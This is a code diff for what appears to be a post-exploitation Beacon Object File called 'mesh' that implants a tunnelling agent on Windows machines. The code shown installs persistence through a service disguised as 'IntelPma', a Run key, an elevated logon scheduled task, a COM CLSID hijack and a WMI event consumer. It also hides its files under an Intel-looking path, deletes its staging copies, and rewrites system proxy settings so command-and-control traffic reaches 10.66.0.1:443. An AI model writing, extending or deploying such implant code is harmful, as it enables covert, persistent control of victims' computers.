@@ -174,6 +174,11 @@ static int nonempty(const char *s)
     return s && s[0];
 }
 
+static const char *nz(const char *s)
+{
+    return nonempty(s) ? s : "-";
+}
+
 static int parse_listen_port(const char *s)
 {
     const char *p;
@@ -250,8 +255,11 @@ static DWORD run_hidden_ex(const char *cmd, int waitms)
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW;
     MSVCRT$_snprintf(buf, sizeof(buf), "%s", cmd);
-    if (!KERNEL32$CreateProcessA(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
-        return KERNEL32$GetLastError();
+    if (!KERNEL32$CreateProcessA(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        code = KERNEL32$GetLastError();
+        BeaconPrintf(CALLBACK_ERROR, "[mesh] CreateProcess err=%u\n", code);
+        return code;
+    }
     if (waitms > 0) {
         KERNEL32$WaitForSingleObject(pi.hProcess, (DWORD)waitms);
         KERNEL32$GetExitCodeProcess(pi.hProcess, &code);
@@ -334,6 +342,7 @@ static int write_reg_conf(const char *text, DWORD n)
         BeaconPrintf(CALLBACK_ERROR, "[mesh] RegSetValue %ld\n", st);
         return 0;
     }
+    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] HKLM conf %u bytes ok\n", n);
     return 1;
 }
 
@@ -345,6 +354,7 @@ static void start_svc(const char *svc, const char *binpath)
     SERVICE_FAILURE_ACTIONS_B fa;
     SERVICE_DELAYED_AUTO_START_INFO_B delayed;
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist svc create name=%s\n", svc);
     scm = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
     if (!scm) {
         BeaconPrintf(CALLBACK_ERROR, "[mesh] OpenSCManager err=%u (need SYSTEM/admin)\n", KERNEL32$GetLastError());
@@ -386,6 +396,9 @@ static void start_svc(const char *svc, const char *binpath)
             ADVAPI32$CloseServiceHandle(scm);
             return;
         }
+        BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist svc %s already running\n", svc);
+    } else {
+        BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist svc %s started delayed-auto NetworkService\n", svc);
     }
     ADVAPI32$CloseServiceHandle(hsvc);
     ADVAPI32$CloseServiceHandle(scm);
@@ -396,26 +409,37 @@ static void start_svc(const char *svc, const char *binpath)
 static void persist_run(const char *name, const char *binpath)
 {
     HKEY hk = NULL;
-    if (ADVAPI32$RegCreateKeyExA(
-            HKEY_CURRENT_USER,
-            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-            0, NULL, 0, KEY_SET_VALUE | KEY_CREATE_SUB_KEY, NULL, &hk, NULL) != ERROR_SUCCESS ||
-        !hk)
+    LONG st;
+    st = ADVAPI32$RegCreateKeyExA(
+        HKEY_CURRENT_USER,
+        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        0, NULL, 0, KEY_SET_VALUE | KEY_CREATE_SUB_KEY, NULL, &hk, NULL);
+    if (st != ERROR_SUCCESS || !hk) {
+        BeaconPrintf(CALLBACK_ERROR, "[mesh] persist run RegCreate err=%ld\n", st);
         return;
-    ADVAPI32$RegSetValueExA(hk, name, 0, REG_SZ, (const BYTE *)binpath, (DWORD)MSVCRT$strlen(binpath) + 1);
+    }
+    st = ADVAPI32$RegSetValueExA(hk, name, 0, REG_SZ, (const BYTE *)binpath, (DWORD)MSVCRT$strlen(binpath) + 1);
     ADVAPI32$RegCloseKey(hk);
-    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist run HKCU\\...\\Run\\%s\n", name);
+    if (st != ERROR_SUCCESS)
+        BeaconPrintf(CALLBACK_ERROR, "[mesh] persist run RegSet err=%ld\n", st);
+    else
+        BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist run HKCU\\...\\Run\\%s ok\n", name);
 }
 
 static void persist_schtask(const char *name, const char *binpath)
 {
     char cmd[2048];
+    DWORD c;
     MSVCRT$_snprintf(
         cmd, sizeof(cmd),
         "C:\\Windows\\System32\\schtasks.exe /create /tn \"%s\" /tr \"%s\" /sc ONLOGON /rl HIGHEST /f",
         name, binpath);
-    run_hidden(cmd);
-    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist schtask onlogon %s\n", name);
+    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist schtask ONLOGON name=%s\n", name);
+    c = run_hidden_ex(cmd, 15000);
+    if (c != 0)
+        BeaconPrintf(CALLBACK_ERROR, "[mesh] persist schtask %s exit=%u\n", name, c);
+    else
+        BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist schtask %s ok\n", name);
 }
 
 static void persist_clsid(const char *binpath)
@@ -427,6 +451,9 @@ static void persist_clsid(const char *binpath)
     if (ADVAPI32$RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL, 0, KEY_SET_VALUE | KEY_CREATE_SUB_KEY, NULL, &hk, NULL) == ERROR_SUCCESS && hk) {
         ADVAPI32$RegSetValueExA(hk, NULL, 0, REG_SZ, (const BYTE *)binpath, (DWORD)MSVCRT$strlen(binpath) + 1);
         ADVAPI32$RegCloseKey(hk);
+        BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist clsid LocalServer32 ok\n");
+    } else {
+        BeaconPrintf(CALLBACK_ERROR, "[mesh] persist clsid RegCreate err=%u\n", KERNEL32$GetLastError());
     }
     /* logon fires CoCreate of our LocalServer32 */
     MSVCRT$_snprintf(
@@ -454,13 +481,21 @@ static void persist_wmi(const char *binpath)
         "Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c} | Out-Null"
         "\"",
         binpath);
-    run_hidden(cmd);
     BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist wmi logon consumer IntelPma\n");
+    {
+        DWORD c = run_hidden_ex(cmd, 20000);
+        if (c != 0)
+            BeaconPrintf(CALLBACK_ERROR, "[mesh] persist wmi exit=%u\n", c);
+        else
+            BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist wmi ok\n");
+    }
 }
 
 static DWORD spawn_line(const char *line)
 {
-    DWORD pid = run_hidden_ex(line, 0);
+    DWORD pid;
+    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] spawn %s\n", line);
+    pid = run_hidden_ex(line, 0);
     BeaconPrintf(CALLBACK_OUTPUT, "[mesh] ram pid=%u\n", pid);
     return pid;
 }
@@ -522,6 +557,41 @@ static int tcp_open(const char *ip, int port)
     return ok;
 }
 
+static void cmd_help(const char *topic)
+{
+    int all;
+    all = !nonempty(topic) || MSVCRT$_stricmp(topic, "help") == 0;
+    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] help\n");
+    if (all || MSVCRT$_stricmp(topic, "ram") == 0)
+        BeaconPrintf(CALLBACK_OUTPUT, " ram <exe> [conf]              session only, no SCM, dies on logoff\n");
+    if (all || MSVCRT$_stricmp(topic, "install") == 0) {
+        BeaconPrintf(CALLBACK_OUTPUT, " install --client|--hub [--persist METHOD] <exe> [conf] [svc]\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "   --client  peer to hub (default)\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "   --hub     also firewall UDP ListenPort from conf\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "   --persist default METHOD=svc. comma ok: svc,onlogon,clsid,wmi\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "   METHOD    svc|service  SCM delayed-auto NetworkService\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "             run|autostart  HKCU\\\\...\\\\Run\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "             onlogon|schtask|task  schtasks ONLOGON /rl HIGHEST\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "             clsid|com  HKCU CLSID LocalServer32 + CoCreate schtask\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "             wmi  logon CommandLineEventConsumer\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "   persist disk: %%ProgramData%%\\\\Intel\\\\Ipma\\\\ipmasvc.exe\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "                 HKLM\\\\SOFTWARE\\\\Intel\\\\PowerManager\\\\Data\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "   [svc] default IntelPma\n");
+    }
+    if (all || MSVCRT$_stricmp(topic, "persist") == 0)
+        BeaconPrintf(CALLBACK_OUTPUT, " persist <exe> [conf] [svc]   alias install --client --persist svc\n");
+    if (all || MSVCRT$_stricmp(topic, "hub") == 0)
+        BeaconPrintf(CALLBACK_OUTPUT, " hub <exe> [conf] [svc]       alias install --hub --persist svc\n");
+    if (all || MSVCRT$_stricmp(topic, "proxy") == 0)
+        BeaconPrintf(CALLBACK_OUTPUT, " proxy [127.0.0.1] [8080]     WinHTTP+IE → riptide CONNECT → 10.66.0.1:443\n");
+    if (all || MSVCRT$_stricmp(topic, "checkin") == 0)
+        BeaconPrintf(CALLBACK_OUTPUT, " checkin                      on/off :1080 :8080 :7670 :7668 svc=\n");
+    if (all || MSVCRT$_stricmp(topic, "clear") == 0)
+        BeaconPrintf(CALLBACK_OUTPUT, " clear [svc]                  wipe svc, Run, schtask, clsid, wmi, files, HKLM, fw\n");
+    BeaconPrintf(CALLBACK_OUTPUT, " help mesh | mesh help | mesh help install\n");
+    BeaconPrintf(CALLBACK_OUTPUT, " ex: mesh install --client --persist svc,onlogon C:\\\\Users\\\\Public\\\\ipmasvc.exe C:\\\\Users\\\\Public\\\\peer.conf IntelPma\n");
+}
+
 static void cmd_checkin(void)
 {
     int p1080, p8080, p7670, p7668;
@@ -532,6 +602,7 @@ static void cmd_checkin(void)
     char ports[80];
     int any = 0;
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] checkin probe 127.0.0.1 :1080 :8080 :7670 :7668 + svc IntelPma\n");
     p1080 = tcp_open("127.0.0.1", 1080);
     p8080 = tcp_open("127.0.0.1", 8080);
     p7670 = tcp_open("127.0.0.1", 7670);
@@ -580,6 +651,7 @@ static void cmd_checkin(void)
 static void cmd_ram(const char *src_exe, const char *src_conf)
 {
     char line[MAX_PATH * 3];
+    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] ram exe=%s conf=%s\n", nz(src_exe), nz(src_conf));
     if (!nonempty(src_exe)) {
         BeaconPrintf(CALLBACK_ERROR, "[mesh] ram needs exe\n");
         return;
@@ -615,6 +687,13 @@ static void cmd_install(const char *src_exe, const char *src_conf, const char *s
     }
     if (!nonempty(svc))
         svc = "IntelPma";
+    BeaconPrintf(
+        CALLBACK_OUTPUT,
+        "[mesh] install role=%s persist=%s methods=%s\n",
+        hub ? "hub" : "client",
+        persist ? "yes" : "no",
+        persist ? methods : "-");
+    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] exe=%s conf=%s svc=%s\n", src_exe, nz(src_conf), svc);
     if (KERNEL32$GetFileAttributesA(src_exe) == INVALID_FILE_ATTRIBUTES) {
         BeaconPrintf(CALLBACK_ERROR, "[mesh] exe missing %s err=%u\n", src_exe, KERNEL32$GetLastError());
         return;
@@ -631,11 +710,13 @@ static void cmd_install(const char *src_exe, const char *src_conf, const char *s
         KERNEL32$CreateDirectoryA(intel, NULL);
         KERNEL32$CreateDirectoryA(dest_dir, NULL);
         hide_path(dest_dir);
+        BeaconPrintf(CALLBACK_OUTPUT, "[mesh] dest %s\n", dest_dir);
         if (!KERNEL32$CopyFileA(src_exe, dest_exe, FALSE)) {
             BeaconPrintf(CALLBACK_ERROR, "[mesh] CopyFile exe err=%u\n", KERNEL32$GetLastError());
             return;
         }
         hide_path(dest_exe);
+        BeaconPrintf(CALLBACK_OUTPUT, "[mesh] copied exe -> %s\n", dest_exe);
         if (nonempty(src_conf)) {
             confbuf = read_all(src_conf, &confn);
             if (!confbuf) {
@@ -643,22 +724,29 @@ static void cmd_install(const char *src_exe, const char *src_conf, const char *s
                 return;
             }
             listen = parse_listen_port(confbuf);
+            BeaconPrintf(CALLBACK_OUTPUT, "[mesh] conf bytes=%u listen=%d\n", confn, listen);
             if (!write_reg_conf(confbuf, confn)) {
                 KERNEL32$VirtualFree(confbuf, 0, MEM_RELEASE);
                 return;
             }
+            BeaconPrintf(CALLBACK_OUTPUT, "[mesh] conf HKLM\\%s\\%s\n", REG_KEY, REG_VAL);
             KERNEL32$VirtualFree(confbuf, 0, MEM_RELEASE);
-            KERNEL32$DeleteFileA(src_conf);
+            if (KERNEL32$DeleteFileA(src_conf))
+                BeaconPrintf(CALLBACK_OUTPUT, "[mesh] wiped staging conf %s\n", src_conf);
         }
-        KERNEL32$DeleteFileA(src_exe);
+        if (KERNEL32$DeleteFileA(src_exe))
+            BeaconPrintf(CALLBACK_OUTPUT, "[mesh] wiped staging exe %s\n", src_exe);
         MSVCRT$_snprintf(
             binpath, sizeof(binpath),
             "\"%s\" --config %s --svc %s", dest_exe, REG_CONF_SPEC, svc);
         {
             char plain[MAX_PATH * 2];
             MSVCRT$_snprintf(plain, sizeof(plain), "%s --config %s --svc %s", dest_exe, REG_CONF_SPEC, svc);
+            BeaconPrintf(CALLBACK_OUTPUT, "[mesh] methods=%s binpath=%s\n", methods, binpath);
             if (want_svc(methods))
                 start_svc(svc, binpath);
+            else
+                BeaconPrintf(CALLBACK_OUTPUT, "[mesh] skip svc\n");
             if (want_run(methods))
                 persist_run(svc, plain);
             if (want_task(methods))
@@ -686,11 +774,13 @@ static void cmd_install(const char *src_exe, const char *src_conf, const char *s
     MSVCRT$_snprintf(dest_dir, MAX_PATH, "%s\\Riptide", pf);
     MSVCRT$_snprintf(dest_exe, MAX_PATH, "%s\\riptide-agent.exe", dest_dir);
     MSVCRT$_snprintf(dest_conf, MAX_PATH, "%s\\peer.conf", dest_dir);
+    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] session dest %s\n", dest_dir);
     KERNEL32$CreateDirectoryA(dest_dir, NULL);
     if (!KERNEL32$CopyFileA(src_exe, dest_exe, FALSE)) {
         BeaconPrintf(CALLBACK_ERROR, "[mesh] CopyFile exe err=%u\n", KERNEL32$GetLastError());
         return;
     }
+    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] copied exe -> %s\n", dest_exe);
     if (nonempty(src_conf)) {
         if (!KERNEL32$CopyFileA(src_conf, dest_conf, FALSE)) {
             BeaconPrintf(CALLBACK_ERROR, "[mesh] CopyFile conf err=%u\n", KERNEL32$GetLastError());
@@ -744,6 +834,7 @@ static void cmd_clear(const char *svc)
     HKEY hk = NULL;
     char cmd[320];
 
+    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] clear start svc=%s\n", nz(svc));
     if (nonempty(svc))
         zap_svc(svc);
     zap_svc("IntelPma");
@@ -804,6 +895,7 @@ static void cmd_proxy(const char *host, const char *port)
     if (!nonempty(port))
         port = "8080";
     MSVCRT$_snprintf(proxy, sizeof(proxy), "%s:%s", host, port);
+    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] proxy set %s\n", proxy);
 
     if (ADVAPI32$RegCreateKeyExA(
             HKEY_CURRENT_USER,
@@ -814,12 +906,18 @@ static void cmd_proxy(const char *host, const char *port)
         ADVAPI32$RegSetValueExA(hk, "ProxyServer", 0, REG_SZ, (const BYTE *)proxy, (DWORD)MSVCRT$strlen(proxy) + 1);
         ADVAPI32$RegSetValueExA(hk, "ProxyOverride", 0, REG_SZ, (const BYTE *)bypass, (DWORD)MSVCRT$strlen(bypass) + 1);
         ADVAPI32$RegCloseKey(hk);
+        BeaconPrintf(CALLBACK_OUTPUT, "[mesh] proxy HKCU Internet Settings ok\n");
+    } else {
+        BeaconPrintf(CALLBACK_ERROR, "[mesh] proxy RegCreate err=%u\n", KERNEL32$GetLastError());
     }
     MSVCRT$_snprintf(
         cmd, sizeof(cmd),
         "C:\\Windows\\System32\\netsh.exe winhttp set proxy proxy-server=%s bypass-list=localhost;127.0.0.1",
         proxy);
-    run_hidden(cmd);
+    {
+        DWORD c = run_hidden_ex(cmd, 15000);
+        BeaconPrintf(CALLBACK_OUTPUT, "[mesh] proxy netsh winhttp exit=%u\n", c);
+    }
     BeaconPrintf(
         CALLBACK_OUTPUT,
         "[mesh] proxy %s  (Demon WinHTTP + IE). riptide HTTP CONNECT splices C2 to 10.66.0.1:443. existing session picks it up on reconnect.\n",
@@ -847,7 +945,14 @@ void go(char *args, int len)
     if (!nonempty(cmd))
         cmd = "install";
 
-    if (MSVCRT$_stricmp(cmd, "ram") == 0)
+    BeaconPrintf(
+        CALLBACK_OUTPUT,
+        "[mesh] go cmd=%s a=%s b=%s c=%s\n",
+        nz(cmd), nz(role), nz(methods), nz(exe));
+
+    if (MSVCRT$_stricmp(cmd, "help") == 0)
+        cmd_help(role);
+    else if (MSVCRT$_stricmp(cmd, "ram") == 0)
         cmd_ram(role, methods); /* packed as ram, exe, conf, ... */
     else if (MSVCRT$_stricmp(cmd, "checkin") == 0)
         cmd_checkin();
